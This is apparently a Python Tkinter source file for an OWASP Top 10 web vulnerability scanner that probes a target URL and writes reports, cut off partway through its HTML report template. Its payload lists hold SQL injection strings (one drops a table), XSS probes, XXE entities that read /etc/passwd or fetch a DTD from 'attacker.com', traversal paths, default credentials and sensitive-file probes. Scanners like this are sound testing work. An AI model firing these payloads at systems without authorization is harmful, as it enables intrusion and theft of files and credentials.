# tools/web_app_security_scanner.py - Web Application Security Scanner
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import threading
import json
import time
import urllib.parse
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from base_tool import SecurityToolFrame
from theme import BG_COLOR, TEXT_COLOR, style_button
from utils import ensure_results_subfolder

TAB_NAME = "Web App Security Scanner"

class WebAppSecurityScanner(SecurityToolFrame):
    """Web application security scanner for OWASP Top 10 vulnerabilities"""
    
    def __init__(self, master):
        super().__init__(master, {
            'name': 'Web App Security Scanner',
            'tool_id': 'web_app_security_scanner',
            'category': 'Security'
        })
        
        ensure_results_subfolder("Web_App_Security_Scanner")
        
        # Initialize variables
        self.scan_results = []
        self.scan_thread = None
        self.is_scanning = False
        self.session = requests.Session()
        
        # Initialize vulnerability tests
        self.vulnerability_tests = self.initialize_vulnerability_tests()
        
        # Build UI
        self.setup_ui()
    
    def initialize_vulnerability_tests(self) -> Dict[str, Dict]:
        """Initialize OWASP Top 10 vulnerability tests"""
        return {
            'injection': {
                'name': 'SQL Injection',
                'description': 'Test for SQL injection vulnerabilities',
                'severity': 'CRITICAL',
                'payloads': [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "'; DROP TABLE users--",
                    "1' AND 1=1--",
                    "admin'--"
                ]
            },
            'broken_auth': {
                'name': 'Broken Authentication',
                'description': 'Test for authentication bypass vulnerabilities',
                'severity': 'HIGH',
                'tests': [
                    'weak_passwords',
                    'session_fixation',
                    'credential_stuffing'
                ]
            },
            'sensitive_data': {
                'name': 'Sensitive Data Exposure',
                'description': 'Test for sensitive data exposure',
                'severity': 'HIGH',
                'checks': [
                    'ssl_configuration',
                    'sensitive_files',
                    'information_disclosure'
                ]
            },
            'xxe': {
                'name': 'XML External Entities (XXE)',
                'description': 'Test for XXE vulnerabilities',
                'severity': 'HIGH',
                'payloads': [
                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/evil.dtd">]><root>&test;</root>'
                ]
            },
            'broken_access': {
                'name': 'Broken Access Control',
                'description': 'Test for access control vulnerabilities',
                'severity': 'HIGH',
                'tests': [
                    'directory_traversal',
                    'privilege_escalation',
                    'idor'
                ]
            },
            'security_misconfig': {
                'name': 'Security Misconfiguration',
                'description': 'Test for security misconfigurations',
                'severity': 'MEDIUM',
                'checks': [
                    'default_credentials',
                    'unnecessary_services',
                    'error_handling'
                ]
            },
            'xss': {
                'name': 'Cross-Site Scripting (XSS)',
                'description': 'Test for XSS vulnerabilities',
                'severity': 'MEDIUM',
                'payloads': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    'javascript:alert("XSS")',
                    '<svg onload=alert("XSS")>',
                    '"><script>alert("XSS")</script>'
                ]
            },
            'insecure_deserialization': {
                'name': 'Insecure Deserialization',
                'description': 'Test for insecure deserialization',
                'severity': 'HIGH',
                'checks': [
                    'serialized_objects',
                    'pickle_injection'
                ]
            },
            'vulnerable_components': {
                'name': 'Vulnerable Components',
                'description': 'Test for known vulnerable components',
                'severity': 'MEDIUM',
                'checks': [
                    'outdated_libraries',
                    'known_cves'
                ]
            },
            'insufficient_logging': {
                'name': 'Insufficient Logging & Monitoring',
                'description': 'Test for logging and monitoring issues',
                'severity': 'LOW',
                'checks': [
                    'audit_logs',
                    'monitoring_capabilities'
                ]
            }
        }
    
    def setup_ui(self):
        """Setup the user interface"""
        # Main container
        main_frame = tk.Frame(self, bg=BG_COLOR)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Left panel for controls
        left_panel = tk.Frame(main_frame, bg=BG_COLOR, width=400)
        left_panel.pack(side="left", fill="y", padx=(0, 10))
        left_panel.pack_propagate(False)
        
        # Title
        title_label = tk.Label(left_panel, text="🌐 Web App Security Scanner", 
                              bg=BG_COLOR, fg=TEXT_COLOR, 
                              font=("Consolas", 14, "bold"))
        title_label.pack(pady=(0, 10))
        
        # Ethical notice
        ethical_notice = tk.Label(left_panel, 
                                text="⚠️ Use responsibly and only on systems you own or have permission to test",
                                bg=BG_COLOR, fg="#FFA500", 
                                font=("Consolas", 9),
                                wraplength=380, justify="center")
        ethical_notice.pack(pady=(0, 20))
        
        # Target configuration
        target_frame = tk.LabelFrame(left_panel, text="Target Configuration", 
                                   bg=BG_COLOR, fg=TEXT_COLOR)
        target_frame.pack(fill="x", pady=10)
        
        # URL input
        tk.Label(target_frame, text="Target URL:", bg=BG_COLOR, fg=TEXT_COLOR).pack(anchor="w")
        self.url_entry = tk.Entry(target_frame, bg="#111111", fg=TEXT_COLOR, 
                                insertbackground=TEXT_COLOR)
        self.url_entry.pack(fill="x", pady=2)
        self.url_entry.insert(0, "http://localhost:8080")
        
        # Authentication
        auth_frame = tk.Frame(target_frame, bg=BG_COLOR)
        auth_frame.pack(fill="x", pady=5)
        
        self.use_auth = tk.BooleanVar()
        tk.Checkbutton(auth_frame, text="Use Authentication", 
                      variable=self.use_auth, bg=BG_COLOR, fg=TEXT_COLOR,
                      selectcolor=BG_COLOR, command=self.toggle_auth).pack(anchor="w")
        
        self.auth_frame = tk.Frame(target_frame, bg=BG_COLOR)
        
        tk.Label(self.auth_frame, text="Username:", bg=BG_COLOR, fg=TEXT_COLOR).pack(anchor="w")
        self.username_entry = tk.Entry(self.auth_frame, bg="#111111", fg=TEXT_COLOR,
                                     insertbackground=TEXT_COLOR)
        self.username_entry.pack(fill="x", pady=2)
        
        tk.Label(self.auth_frame, text="Password:", bg=BG_COLOR, fg=TEXT_COLOR).pack(anchor="w")
        self.password_entry = tk.Entry(self.auth_frame, bg="#111111", fg=TEXT_COLOR,
                                     insertbackground=TEXT_COLOR, show="*")
        self.password_entry.pack(fill="x", pady=2)
        
        # Scan options
        options_frame = tk.LabelFrame(left_panel, text="Scan Options", 
                                    bg=BG_COLOR, fg=TEXT_COLOR)
        options_frame.pack(fill="x", pady=10)
        
        # Scan intensity
        tk.Label(options_frame, text="Scan Intensity:", bg=BG_COLOR, fg=TEXT_COLOR).pack(anchor="w")
        self.intensity = tk.StringVar(value="medium")
        
        intensity_frame = tk.Frame(options_frame, bg=BG_COLOR)
        intensity_frame.pack(fill="x")
        
        tk.Radiobutton(intensity_frame, text="Light", variable=self.intensity, 
                      value="light", bg=BG_COLOR, fg=TEXT_COLOR,
                      selectcolor=BG_COLOR).pack(side="left")
        tk.Radiobutton(intensity_frame, text="Medium", variable=self.intensity, 
                      value="medium", bg=BG_COLOR, fg=TEXT_COLOR,
                      selectcolor=BG_COLOR).pack(side="left")
        tk.Radiobutton(intensity_frame, text="Aggressive", variable=self.intensity, 
                      value="aggressive", bg=BG_COLOR, fg=TEXT_COLOR,
                      selectcolor=BG_COLOR).pack(side="left")
        
        # Request settings
        tk.Label(options_frame, text="Request Delay (seconds):", 
                bg=BG_COLOR, fg=TEXT_COLOR).pack(anchor="w", pady=(10, 0))
        self.delay_entry = tk.Entry(options_frame, bg="#111111", fg=TEXT_COLOR,
                                  insertbackground=TEXT_COLOR)
        self.delay_entry.pack(fill="x", pady=2)
        self.delay_entry.insert(0, "1")
        
        tk.Label(options_frame, text="Timeout (seconds):", 
                bg=BG_COLOR, fg=TEXT_COLOR).pack(anchor="w", pady=(5, 0))
        self.timeout_entry = tk.Entry(options_frame, bg="#111111", fg=TEXT_COLOR,
                                    insertbackground=TEXT_COLOR)
        self.timeout_entry.pack(fill="x", pady=2)
        self.timeout_entry.insert(0, "10")
        
        # Vulnerability selection
        vuln_frame = tk.LabelFrame(left_panel, text="Vulnerability Tests", 
                                 bg=BG_COLOR, fg=TEXT_COLOR)
        vuln_frame.pack(fill="x", pady=10)
        
        # Select all/none buttons
        select_frame = tk.Frame(vuln_frame, bg=BG_COLOR)
        select_frame.pack(fill="x", pady=2)
        
        select_all_btn = tk.Button(select_frame, text="Select All", 
                                 command=self.select_all_vulns)
        style_button(select_all_btn)
        select_all_btn.pack(side="left", padx=(0, 5))
        
        select_none_btn = tk.Button(select_frame, text="Select None", 
                                  command=self.select_no_vulns)
        style_button(select_none_btn)
        select_none_btn.pack(side="left")
        
        # Vulnerability checkboxes
        self.vuln_vars = {}
        for vuln_id, config in self.vulnerability_tests.items():
            var = tk.BooleanVar(value=True)
            self.vuln_vars[vuln_id] = var
            
            severity_color = {
                'CRITICAL': '#FF4444',
                'HIGH': '#FF8800',
                'MEDIUM': '#FFAA00',
                'LOW': '#88AA00'
            }.get(config['severity'], TEXT_COLOR)
            
            cb = tk.Checkbutton(vuln_frame, 
                              text=f"{config['name']} ({config['severity']})", 
                              variable=var, bg=BG_COLOR, fg=severity_color,
                              selectcolor=BG_COLOR)
            cb.pack(anchor="w")
        
        # Control buttons
        button_frame = tk.Frame(left_panel, bg=BG_COLOR)
        button_frame.pack(fill="x", pady=20)
        
        self.scan_button = tk.Button(button_frame, text="Start Security Scan", 
                                   command=self.start_scan)
        style_button(self.scan_button)
        self.scan_button.pack(fill="x", pady=2)
        
        self.stop_button = tk.Button(button_frame, text="Stop Scan", 
                                   command=self.stop_scan, state="disabled")
        style_button(self.stop_button)
        self.stop_button.pack(fill="x", pady=2)
        
        # Export buttons
        export_frame = tk.Frame(left_panel, bg=BG_COLOR)
        export_frame.pack(fill="x", pady=10)
        
        tk.Label(export_frame, text="Export Results:", bg=BG_COLOR, fg=TEXT_COLOR,
                font=("Consolas", 10, "bold")).pack(anchor="w")
        
        export_btn_frame = tk.Frame(export_frame, bg=BG_COLOR)
        export_btn_frame.pack(fill="x", pady=5)
        
        json_btn = tk.Button(export_btn_frame, text="JSON", command=self.export_json)
        style_button(json_btn)
        json_btn.pack(side="left", padx=(0, 5))
        
        html_btn = tk.Button(export_btn_frame, text="HTML", command=self.export_html)
        style_button(html_btn)
        html_btn.pack(side="left", padx=5)
        
        # Right panel for results
        right_panel = tk.Frame(main_frame, bg=BG_COLOR)
        right_panel.pack(side="right", fill="both", expand=True)
        
        # Progress bar
        self.add_progress_bar("Security Scan Progress")
        
        # Results viewer with tabs
        self.add_results_viewer(["Summary", "Vulnerabilities", "Security Headers", "Recommendations"])
        
        # Status label
        self.status_label = tk.Label(right_panel, text="Ready", 
                                   bg=BG_COLOR, fg=TEXT_COLOR)
        self.status_label.pack(pady=5)
    
    def toggle_auth(self):
        """Toggle authentication fields visibility"""
        if self.use_auth.get():
            self.auth_frame.pack(fill="x", pady=5)
        else:
            self.auth_frame.pack_forget()
    
    def select_all_vulns(self):
        """Select all vulnerability tests"""
        for var in self.vuln_vars.values():
            var.set(True)
    
    def select_no_vulns(self):
        """Deselect all vulnerability tests"""
        for var in self.vuln_vars.values():
            var.set(False)
    
    def start_scan(self):
        """Start the web application security scan"""
        if self.is_scanning:
            messagebox.showwarning("Scan in Progress", "A scan is already running.")
            return
        
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Invalid URL", "Please enter a target URL.")
            return
        
        # Validate URL format
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, url)
        
        # Get selected vulnerability tests
        selected_tests = [vuln_id for vuln_id, var in self.vuln_vars.items() if var.get()]
        
        if not selected_tests:
            messagebox.showerror("No Tests Selected", "Please select at least one vulnerability test.")
            return
        
        # Start scan in separate thread
        self.is_scanning = True
        self.scan_button.config(state="disabled")
        self.stop_button.config(state="normal")
        self.scan_results = []
        self.update_progress(0, "Starting security scan...")
        
        self.scan_thread = threading.Thread(target=self.run_scan, args=(url, selected_tests))
        self.scan_thread.daemon = True
        self.scan_thread.start()
    
    def run_scan(self, url: str, selected_tests: List[str]):
        """Run the actual web application security scan"""
        try:
            # Setup session
            self.setup_session()
            
            # Test connectivity
            self.update_progress(5, "Testing connectivity...")
            if not self.test_connectivity(url):
                self.update_progress(0, "Failed to connect to target")
                self.status_label.config(text="Connection failed")
                return
            
            total_tests = len(selected_tests)
            completed_tests = 0
            
            # Run each selected test
            for test_id in selected_tests:
                if not self.is_scanning:
                    break
                
                self.update_progress(10 + (completed_tests / total_tests) * 80, 
                                   f"Running {self.vulnerability_tests[test_id]['name']}...")
                
                self.run_vulnerability_test(url, test_id)
                completed_tests += 1
            
            if self.is_scanning:
                # Analyze security headers
                self.update_progress(90, "Analyzing security headers...")
                self.analyze_security_headers(url)
                
                self.update_progress(100, "Scan completed")
                self.process_scan_results(url)
                self.status_label.config(text=f"Scan completed - {len(self.scan_results)} issues found")
            
        except Exception as e:
            self.update_progress(0, f"Error: {str(e)}")
            self.status_label.config(text=f"Error: {str(e)}")
            messagebox.showerror("Scan Error", f"An error occurred during scanning:\n{str(e)}")
        
        finally:
            self.is_scanning = False
            self.scan_button.config(state="normal")
            self.stop_button.config(state="disabled")
    
    def setup_session(self):
        """Setup requests session with authentication if needed"""
        self.session = requests.Session()
        
        # Set timeout
        timeout = float(self.timeout_entry.get() or 10)
        self.session.timeout = timeout
        
        # Set user agent
        self.session.headers.update({
            'User-Agent': 'WebAppSecurityScanner/1.0'
        })
        
        # Setup authentication if enabled
        if self.use_auth.get():
            username = self.username_entry.get()
            password = self.password_entry.get()
            if username and password:
                self.session.auth = (username, password)
    
    def test_connectivity(self, url: str) -> bool:
        """Test connectivity to the target"""
        try:
            response = self.session.get(url, timeout=10)
            return True
        except Exception:
            return False
    
    def run_vulnerability_test(self, url: str, test_id: str):
        """Run a specific vulnerability test"""
        config = self.vulnerability_tests[test_id]
        delay = float(self.delay_entry.get() or 1)
        
        try:
            if test_id == 'injection':
                self.test_sql_injection(url, config)
            elif test_id == 'xss':
                self.test_xss(url, config)
            elif test_id == 'xxe':
                self.test_xxe(url, config)
            elif test_id == 'broken_access':
                self.test_broken_access_control(url, config)
            elif test_id == 'security_misconfig':
                self.test_security_misconfiguration(url, config)
            elif test_id == 'broken_auth':
                self.test_broken_authentication(url, config)
            elif test_id == 'sensitive_data':
                self.test_sensitive_data_exposure(url, config)
            elif test_id == 'insecure_deserialization':
                self.test_insecure_deserialization(url, config)
            elif test_id == 'vulnerable_components':
                self.test_vulnerable_components(url, config)
            elif test_id == 'insufficient_logging':
                self.test_insufficient_logging(url, config)
            
            # Add delay between tests
            time.sleep(delay)
            
        except Exception as e:
            self.add_finding(url, test_id, 'ERROR', f"Test error: {str(e)}", 'LOW')
    
    def test_sql_injection(self, url: str, config: Dict):
        """Test for SQL injection vulnerabilities"""
        for payload in config['payloads']:
            if not self.is_scanning:
                break
            
            # Test GET parameters
            test_url = f"{url}?id={urllib.parse.quote(payload)}"
            try:
                response = self.session.get(test_url)
                if self.detect_sql_injection_response(response, payload):
                    self.add_finding(url, 'injection', 'SQL Injection (GET)', 
                                   f"Payload: {payload}", config['severity'])
            except Exception:
                pass
            
            # Test POST data
            try:
                response = self.session.post(url, data={'input': payload})
                if self.detect_sql_injection_response(response, payload):
                    self.add_finding(url, 'injection', 'SQL Injection (POST)', 
                                   f"Payload: {payload}", config['severity'])
            except Exception:
                pass
    
    def detect_sql_injection_response(self, response: requests.Response, payload: str) -> bool:
        """Detect SQL injection in response"""
        error_patterns = [
            'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
            'sqlite_', 'postgresql', 'warning: mysql', 'error in your sql syntax'
        ]
        
        response_text = response.text.lower()
        return any(pattern in response_text for pattern in error_patterns)
    
    def test_xss(self, url: str, config: Dict):
        """Test for XSS vulnerabilities"""
        for payload in config['payloads']:
            if not self.is_scanning:
                break
            
            # Test reflected XSS
            test_url = f"{url}?search={urllib.parse.quote(payload)}"
            try:
                response = self.session.get(test_url)
                if payload in response.text:
                    self.add_finding(url, 'xss', 'Reflected XSS', 
                                   f"Payload: {payload}", config['severity'])
            except Exception:
                pass
            
            # Test stored XSS (POST)
            try:
                response = self.session.post(url, data={'comment': payload})
                if payload in response.text:
                    self.add_finding(url, 'xss', 'Stored XSS', 
                                   f"Payload: {payload}", config['severity'])
            except Exception:
                pass
    
    def test_xxe(self, url: str, config: Dict):
        """Test for XXE vulnerabilities"""
        for payload in config['payloads']:
            if not self.is_scanning:
                break
            
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(url, data=payload, headers=headers)
                
                # Check for XXE indicators
                if 'root:' in response.text or 'passwd' in response.text:
                    self.add_finding(url, 'xxe', 'XXE Vulnerability', 
                                   f"XML payload processed", config['severity'])
            except Exception:
                pass
    
    def test_broken_access_control(self, url: str, config: Dict):
        """Test for broken access control"""
        # Test directory traversal
        traversal_payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts']
        
        for payload in traversal_payloads:
            if not self.is_scanning:
                break
            
            test_url = f"{url}?file={urllib.parse.quote(payload)}"
            try:
                response = self.session.get(test_url)
                if 'root:' in response.text or 'localhost' in response.text:
                    self.add_finding(url, 'broken_access', 'Directory Traversal', 
                                   f"Payload: {payload}", config['severity'])
            except Exception:
                pass
    
    def test_security_misconfiguration(self, url: str, config: Dict):
        """Test for security misconfigurations"""
        # Test for common admin paths
        admin_paths = ['/admin', '/administrator', '/wp-admin', '/phpmyadmin', '/admin.php']
        
        for path in admin_paths:
            if not self.is_scanning:
                break
            
            test_url = url.rstrip('/') + path
            try:
                response = self.session.get(test_url)
                if response.status_code == 200:
                    self.add_finding(url, 'security_misconfig', 'Exposed Admin Interface', 
                                   f"Admin path accessible: {path}", config['severity'])
            except Exception:
                pass
        
        # Test for default credentials
        default_creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root')]
        
        for username, password in default_creds:
            if not self.is_scanning:
                break
            
            try:
                response = self.session.post(url, data={'username': username, 'password': password})
                if 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                    self.add_finding(url, 'security_misconfig', 'Default Credentials', 
                                   f"Default credentials work: {username}:{password}", 'CRITICAL')
            except Exception:
                pass
    
    def test_broken_authentication(self, url: str, config: Dict):
        """Test for broken authentication"""
        # Test for session fixation
        try:
            # Get initial session
            response1 = self.session.get(url)
            initial_cookies = response1.cookies
            
            # Try to login
            response2 = self.session.post(url, data={'username': 'test', 'password': 'test'})
            
            # Check if session ID changed
            if initial_cookies and response2.cookies:
                if any(cookie.value == initial_cookies.get(cookie.name) 
                      for cookie in response2.cookies):
                    self.add_finding(url, 'broken_auth', 'Session Fixation', 
                                   'Session ID not regenerated after login', config['severity'])
        except Exception:
            pass
    
    def test_sensitive_data_exposure(self, url: str, config: Dict):
        """Test for sensitive data exposure"""
        # Test for sensitive files
        sensitive_files = ['/backup.sql', '/.env', '/config.php', '/database.yml', '/.git/config']
        
        for file_path in sensitive_files:
            if not self.is_scanning:
                break
            
            test_url = url.rstrip('/') + file_path
            try:
                response = self.session.get(test_url)
                if response.status_code == 200 and len(response.text) > 100:
                    self.add_finding(url, 'sensitive_data', 'Sensitive File Exposure', 
                                   f"Sensitive file accessible: {file_path}", config['severity'])
            except Exception:
                pass
    
    def test_insecure_deserialization(self, url: str, config: Dict):
        """Test for insecure deserialization"""
        # This is a simplified test - in practice, this would be more complex
        try:
            # Test for pickle deserialization
            import pickle
            import base64
            
            # Create a simple test object
            test_obj = {'test': 'data'}
            pickled = base64.b64encode(pickle.dumps(test_obj)).decode()
            
            response = self.session.post(url, data={'serialized': pickled})
            
            # Check for deserialization indicators
            if 'pickle' in response.text.lower() or 'serialized' in response.text.lower():
                self.add_finding(url, 'insecure_deserialization', 'Potential Deserialization', 
                               'Application may deserialize untrusted data', config['severity'])
        except Exception:
            pass
    
    def test_vulnerable_components(self, url: str, config: Dict):
        """Test for vulnerable components"""
        try:
            response = self.session.get(url)
            
            # Check server headers for version information
            server_header = response.headers.get('Server', '')
            if server_header:
                # Check for known vulnerable versions (simplified)
                vulnerable_patterns = ['Apache/2.2', 'nginx/1.0', 'IIS/6.0']
                for pattern in vulnerable_patterns:
                    if pattern in server_header:
                        self.add_finding(url, 'vulnerable_components', 'Outdated Server', 
                                       f"Potentially vulnerable server: {server_header}", config['severity'])
            
            # Check for framework indicators
            framework_headers = ['X-Powered-By', 'X-AspNet-Version', 'X-Framework']
            for header in framework_headers:
                if header in response.headers:
                    self.add_finding(url, 'vulnerable_components', 'Framework Disclosure', 
                                   f"Framework information disclosed: {header}: {response.headers[header]}", 
                                   'LOW')
        except Exception:
            pass
    
    def test_insufficient_logging(self, url: str, config: Dict):
        """Test for insufficient logging and monitoring"""
        # This is more of an informational check
        try:
            # Test multiple failed login attempts
            for i in range(5):
                if not self.is_scanning:
                    break
                
                response = self.session.post(url, data={'username': f'test{i}', 'password': 'wrong'})
                time.sleep(0.5)
            
            # Check if account gets locked or rate limited
            final_response = self.session.post(url, data={'username': 'test', 'password': 'wrong'})
            
            if final_response.status_code == 200:  # No rate limiting
                self.add_finding(url, 'insufficient_logging', 'No Rate Limiting', 
                               'Multiple failed login attempts not rate limited', config['severity'])
        except Exception:
            pass
    
    def analyze_security_headers(self, url: str):
        """Analyze security headers"""
        try:
            response = self.session.get(url)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME type sniffing protection',
                'X-XSS-Protection': 'XSS protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'Content security policy',
                'Referrer-Policy': 'Referrer policy'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.add_finding(url, 'security_headers', f'Missing {header}', 
                                   f'Missing security header: {description}', 'MEDIUM')
            
            # Check for insecure header values
            if 'X-Frame-Options' in headers and headers['X-Frame-Options'].upper() == 'ALLOWALL':
                self.add_finding(url, 'security_headers', 'Insecure X-Frame-Options', 
                               'X-Frame-Options set to ALLOWALL', 'HIGH')
            
        except Exception:
            pass
    
    def add_finding(self, url: str, category: str, title: str, description: str, severity: str):
        """Add a security finding"""
        finding = {
            'url': url,
            'category': category,
            'title': title,
            'description': description,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        }
        self.scan_results.append(finding)
    
    def process_scan_results(self, url: str):
        """Process and display scan results"""
        if not self.scan_results:
            self.update_results_tab("Summary", "No security issues found.")
            self.update_results_tab("Vulnerabilities", "No vulnerabilities detected.")
            self.update_results_tab("Security Headers", "Security headers analysis complete.")
            self.update_results_tab("Recommendations", "No specific recommendations.")
            return
        
        # Update all tabs
        self.update_summary_tab(url)
        self.update_vulnerabilities_tab()
        self.update_security_headers_tab()
        self.update_recommendations_tab()
        
        # Set results data for export
        self.set_results_data({
            'scan_metadata': {
                'target_url': url,
                'scan_timestamp': datetime.now().isoformat(),
                'total_issues': len(self.scan_results)
            },
            'summary': self.generate_summary_data(),
            'findings': self.scan_results
        })
    
    def generate_summary_data(self) -> Dict:
        """Generate summary statistics"""
        summary = {
            'total_issues': len(self.scan_results),
            'by_severity': {},
            'by_category': {}
        }
        
        for result in self.scan_results:
            # Count by severity
            severity = result['severity']
            summary['by_severity'][severity] = summary['by_severity'].get(severity, 0) + 1
            
            # Count by category
            category = result['category']
            summary['by_category'][category] = summary['by_category'].get(category, 0) + 1
        
        return summary
    
    def update_summary_tab(self, url: str):
        """Update the summary tab"""
        summary_data = self.generate_summary_data()
        
        summary_text = f"""Web Application Security Scan Summary
{'='*45}

Target URL: {url}
Scan Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Issues Found: {summary_data['total_issues']}

Severity Breakdown:
"""
        
        severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        for severity in severity_order:
            count = summary_data['by_severity'].get(severity, 0)
            if count > 0:
                summary_text += f"  {severity}: {count}\n"
        
        summary_text += "\nIssue Categories:\n"
        for category, count in sorted(summary_data['by_category'].items()):
            display_name = category.replace('_', ' ').title()
            summary_text += f"  {display_name}: {count}\n"
        
        # Risk assessment
        critical_count = summary_data['by_severity'].get('CRITICAL', 0)
        high_count = summary_data['by_severity'].get('HIGH', 0)
        
        summary_text += f"\nRisk Assessment:\n"
        if critical_count > 0:
            summary_text += f"🚨 CRITICAL: {critical_count} critical vulnerabilities require immediate attention\n"
        if high_count > 0:
            summary_text += f"⚠️  HIGH: {high_count} high-severity issues should be addressed promptly\n"
        
        if critical_count == 0 and high_count == 0:
            summary_text += "✅ No critical or high-severity vulnerabilities detected\n"
        
        self.update_results_tab("Summary", summary_text)
    
    def update_vulnerabilities_tab(self):
        """Update the vulnerabilities tab"""
        vuln_text = f"""Vulnerability Details
{'='*25}

"""
        
        # Group by severity
        by_severity = {}
        for result in self.scan_results:
            severity = result['severity']
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(result)
        
        severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        for severity in severity_order:
            if severity in by_severity:
                vuln_text += f"\n{severity} SEVERITY ({len(by_severity[severity])}):\n"
                vuln_text += f"{'─' * 40}\n"
                
                for vuln in by_severity[severity]:
                    vuln_text += f"• {vuln['title']}\n"
                    vuln_text += f"  Category: {vuln['category'].replace('_', ' ').title()}\n"
                    vuln_text += f"  Description: {vuln['description']}\n"
                    vuln_text += f"  URL: {vuln['url']}\n\n"
        
        self.update_results_tab("Vulnerabilities", vuln_text)
    
    def update_security_headers_tab(self):
        """Update the security headers tab"""
        header_issues = [r for r in self.scan_results if r['category'] == 'security_headers']
        
        headers_text = f"""Security Headers Analysis
{'='*30}

"""
        
        if header_issues:
            headers_text += f"Security Header Issues ({len(header_issues)}):\n\n"
            for issue in header_issues:
                headers_text += f"• {issue['title']}\n"
                headers_text += f"  {issue['description']}\n"
                headers_text += f"  Severity: {issue['severity']}\n\n"
        else:
            headers_text += "✅ No security header issues detected.\n"
        
        headers_text += """
Recommended Security Headers:

• X-Frame-Options: Prevents clickjacking attacks
• X-Content-Type-Options: Prevents MIME type sniffing
• X-XSS-Protection: Enables XSS filtering
• Strict-Transport-Security: Enforces HTTPS
• Content-Security-Policy: Controls resource loading
• Referrer-Policy: Controls referrer information
"""
        
        self.update_results_tab("Security Headers", headers_text)
    
    def update_recommendations_tab(self):
        """Update the recommendations tab"""
        recommendations_text = f"""Security Recommendations
{'='*30}

Based on the scan results, here are the recommended actions:

IMMEDIATE ACTIONS:
"""
        
        critical_issues = [r for r in self.scan_results if r['severity'] == 'CRITICAL']
        high_issues = [r for r in self.scan_results if r['severity'] == 'HIGH']
        
        if critical_issues:
            recommendations_text += f"\n🚨 Address {len(critical_issues)} CRITICAL vulnerabilities:\n"
            for issue in critical_issues[:5]:  # Show top 5
                recommendations_text += f"  • {issue['title']}: {issue['description']}\n"
        
        if high_issues:
            recommendations_text += f"\n⚠️  Address {len(high_issues)} HIGH-severity issues:\n"
            for issue in high_issues[:5]:  # Show top 5
                recommendations_text += f"  • {issue['title']}: {issue['description']}\n"
        
        recommendations_text += """

GENERAL SECURITY BEST PRACTICES:

1. Input Validation
   • Validate and sanitize all user inputs
   • Use parameterized queries to prevent SQL injection
   • Implement proper output encoding

2. Authentication & Authorization
   • Implement strong password policies
   • Use multi-factor authentication
   • Implement proper session management
   • Follow principle of least privilege

3. Security Headers
   • Implement all recommended security headers
   • Use Content Security Policy (CSP)
   • Enable HTTPS with HSTS

4. Error Handling
   • Implement proper error handling
   • Don't expose sensitive information in errors
   • Log security events for monitoring

5. Regular Security Practices
   • Keep all components up to date
   • Regular security assessments
   • Implement security monitoring
   • Security awareness training for developers
"""
        
        self.update_results_tab("Recommendations", recommendations_text)
    
    def stop_scan(self):
        """Stop the current scan"""
        if self.is_scanning:
            self.is_scanning = False
            self.scan_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.update_progress(0, "Scan stopped by user")
            self.status_label.config(text="Scan stopped")
            messagebox.showinfo("Scan Stopped", "Scan has been stopped.")
    
    def export_json(self):
        """Export results as JSON"""
        if not self.scan_results:
            messagebox.showwarning("No Results", "No scan results to export.")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json")],
            title="Export Security Scan Results as JSON"
        )
        
        if filename:
            try:
                export_data = {
                    'scan_metadata': {
                        'target_url': self.url_entry.get(),
                        'scan_timestamp': datetime.now().isoformat(),
                        'total_issues': len(self.scan_results),
                        'scanner_version': '1.0'
                    },
                    'summary': self.generate_summary_data(),
                    'findings': self.scan_results
                }
                
                with open(filename, 'w') as f:
                    json.dump(export_data, f, indent=2)
                messagebox.showinfo("Export Successful", f"Results exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export results:\n{str(e)}")
    
    def export_html(self):
        """Export results as HTML report"""
        if not self.scan_results:
            messagebox.showwarning("No Results", "No scan results to export.")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML files", "*.html")],
            title="Export Security Scan Report as HTML"
        )
        
        if filename:
            try:
                html_content = self.generate_html_report()
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(html_content)
                messagebox.showinfo("Export Successful", f"HTML report exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export HTML report:\n{str(e)}")
    
    def generate_html_report(self) -> str:
        """Generate HTML security report"""
        summary_data = self.generate_summary_data()
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Web Application Security Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}
        .summary {{ margin: 20px 0; }}
        .severity-critical {{ color: #d32f2f; font-weight: bold; }}
        .severity-high {{ color: #f57c00; font-weight: bold; }}
        .severity-medium {{ color: #fbc02d; font-weight: bold; }}
        .severity-low {{ color: #388e3c; font-weight: bold; }}
        .finding {{ margin: 10px 0; padding: 10px; border-left: 4px solid #ccc; }}
